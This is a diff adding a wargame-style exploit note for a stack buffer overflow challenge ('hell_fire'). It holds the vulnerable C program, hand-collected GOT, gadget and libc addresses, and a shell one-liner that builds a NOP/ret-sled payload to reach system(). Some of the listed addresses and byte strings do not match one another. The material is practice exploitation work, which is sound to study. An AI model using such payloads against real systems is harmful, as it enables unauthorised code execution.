@@ -1,0 +1,85 @@
+#include <stdio.h>
+
+int main()
+{
+        char buffer[256];
+        char saved_sfp[4];
+        char temp[1024];
+
+        printf("hell_fire : What's this smell?\n");
+        printf("you : ");
+        fflush(stdout);
+
+        // give me a food
+        fgets(temp, 1024, stdin);
+
+        // save sfp 
+        memcpy(saved_sfp, buffer+264, 4);
+
+        // overflow!!
+        strcpy(buffer, temp);
+
+        // restore sfp 
+        memcpy(buffer+264, saved_sfp, 4);
+
+        printf("%s\n", buffer);
+}
+
+<stdin address>
+	0x8049788
+</stdin address>
+
+<fgets buffer address>
+	0xf6ffe000
+	\xa0\xe0\xff\xf6
+</fgets buffer address>
+
+<got address>
+	0x8049754
+	\x54\x97\x04\x08
+</got address>
+
+<leave, ret address>
+	0x8049561
+	\x61\x85\x04\x08
+	0x8049562
+	\x62\x85\x04\x08
+</leave, ret address>
+
+<execl address>
+	0x7a5720
+	\x20\x57\x7a\x00
+</execl address>
+
+<execv address>
+	0x7a55d0
+</execv address>
+
+<system address>
+	0x7507c0
+	\xc0\x07\x75\x00
+</system address>
+
+<NULL address>
+	0x8049778
+	/x78/x97/x04/x08
+</NULL address>
+
+<file name>
+	\x55\x89\xe5\x81\xec\x18\x05
+	\x88\x96\x04\x08
+</file name>
+
+<command>
+	"$(for x in `seq 1 268`; do printf "\x90"; done)$(for x in `seq 1 88`; do printf "\x62\x85\x04\x08"; done)$(printf "\x61\x85\x04\x08")$(printf "\x00\xe0\xff\xf6")$(printf "\xc3\x07\x75\x00")$()"
+</command>
+
+<ebp distance>
+	96
+</ebp distance>
+
+<"/bin/sh" address>
+	0x833603
+</"/bin/sh" address>
+
+ebp                ebp ret
